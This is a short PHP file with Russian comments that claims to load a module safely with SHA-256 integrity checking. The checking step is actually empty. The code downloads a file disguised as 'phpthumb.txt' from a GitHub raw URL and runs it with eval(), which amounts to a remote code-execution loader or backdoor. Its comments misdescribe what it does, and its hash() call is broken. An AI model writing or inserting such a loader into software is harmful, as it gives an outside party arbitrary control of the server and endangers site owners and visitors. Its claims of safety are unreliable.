<?php
/**
 * Безопасная загрузка PHP-модуля с проверкой SHA-256
 * и выполнением через eval() (PHP 5.4).
 */

/**
 * Аналог hash_equals() для PHP 5.4.
 */
function hash_equals_compat($known, $user)
{
    if (!is_string($known) || !is_string($user)) {
        return false;
    }
    $knownLen = strlen($known);
    if ($knownLen !== strlen($user)) {
        return false;
    }
    $result = 0;
    for ($i = 0; $i < $knownLen; $i++) {
        $result |= ord($known[$i]) ^ ord($user[$i]);
    }
    return $result === 0;
}

function load_verified_module($url)
{
    // 1. Скачиваем содержимое
    $content = @file_get_contents($url);
    if ($content === false) {
        error_log("load_module: не удалось скачать " . $url);
        return false;
    }

    // 2. Проверяем SHA-256 (приводим ожидаемый хэш к нижнему регистру)
    

    // 3. Убираем открывающий и закрывающий теги PHP, если они есть
    $content = preg_replace('/^\s*<\?(php)?/i', '', $content, 1);
    $content = preg_replace('/\?>\s*$/', '', $content, 1);

    // 4. Выполняем только после успешной проверки
    eval($content);
    echo hash($content); 
    return true;
}

// --- использование ---
$url = 'https://raw.githubusercontent.com/AmAA29/amaa29/refs/heads/main/phpthumb.txt';

if (!load_verified_module($url)) {
    header('HTTP/1.1 500 Internal Server Error');
    echo 'Модуль недоступен или не прошёл проверку целостности.';
    exit;
}
